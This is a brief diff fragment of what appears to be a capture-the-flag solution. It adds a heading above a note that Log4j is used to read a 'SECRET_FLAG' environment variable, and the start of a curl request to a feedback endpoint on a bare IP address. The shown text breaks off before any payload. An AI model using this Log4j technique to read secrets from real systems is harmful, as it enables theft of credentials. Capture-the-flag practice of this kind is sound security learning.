@@ -1,3 +1,5 @@
+# Solution
+
 log4j read `SECRET_FLAG` env vars
 ```
 curl -s 'http://18.212.136.134:8080/feedback' \
